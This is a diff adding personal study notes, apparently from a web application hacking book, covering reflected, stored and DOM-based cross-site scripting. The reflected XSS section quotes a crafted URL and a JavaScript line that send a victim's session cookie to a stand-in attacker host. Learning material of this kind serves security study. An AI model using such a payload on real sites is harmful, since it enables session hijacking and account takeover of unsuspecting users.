@@ -17,6 +17,9 @@
 - SOAP Injection
 - HTTP Parameter Injection
 - Forced Browsing
+- session fixation
+- Cross-Site request forgery
+
 
 
 
@@ -499,10 +502,57 @@ In Blind Xpath injection we can try the substring technique and retrieve the inf
 - HTTP Parameter Pollution: HPP is an attack technique that arises in various contexts and that often applies in the context of HPI attacks
 
 <!-- Completed till 441/914 (Chapter 11 - Attacking Application Logic)-->
-
+## Chapter 11 - Attacking Application Logic
 - Page 448 (Insurance based flaw)
 
 <!-- Completed till 467/914 (Chapter 12 - Attacking users -  Cross-Site Scripting-->
 
 
 <!-- I have made some changes in the page to test it 2 -->
+
+
+<!-- Started on 11th July after almost a month gap-->
+
+
+## Chapter - 12 Attacking Users: Cross-Site Scripting
+
+- There are 3 types of XSS vulnerabilities:
+1) Reflected
+2) Stored
+3) DOM-based
+
+**Reflected XSS Vulnerability**:
+
+Common example of this vulnerability is when an application uses dynamic error pages. 
+
+Ex: The behaviour of taking user-supplied input and inserting it into the HTML of the server's response is one of the signatures of reflected XSS vulnerabilities.
+
+*Steps:*
+1) A normal user logins to the application and gets a session token from the application
+2) Attacker sends a crafted URL of the application to the user to click and make a request to the application with the crafted URL
+Attackers URL:
+```http://mdsec.net/error/5/Error.ashx?message=<script>var+i=new+Image;+i.src=”http://mdattacker.net/”%2bdocument.cookie;</script>```
+
+3) In the above URL, attacker is exploiting the reflected XSS vulnerability in the message tag which returns the same to the user, as the attacker provided a java script to create a new variable ( var i = new Image) at user end and the varible source is triggering a request to the URL that attacker owns.
+Java script:
+```var i=new Image; i.src=”http://mdattacker.net/”+document.cookie;```
+4) As the java script is from the application, browser uses the same active session token to make a request to attackers URL and the attacker captures the session token and hijacks the active session and proceed with the arbitrary actions as the user.
+
+
+**Stored XSS Vulnerabilities**
+
+It is similar to  reflected, but different as the attacker doesn't require the target user to click any crafted links.
+
+*Steps:*
+
+1) Attacker submits a question containing malicious javascript
+2) Target user logs in
+3) User views the attacker's question
+4) Server responds with the attacker's javascript
+5) Attacker's JS is executed in target users browser
+6) User's browser sends the session token to attacker
+
+**DOM-Based XSS Vulnerabilities**
+
+<!-- Completed till 476 Page-- Need to start with DOM-Baswed XSS Vulnwerabilities-->
+
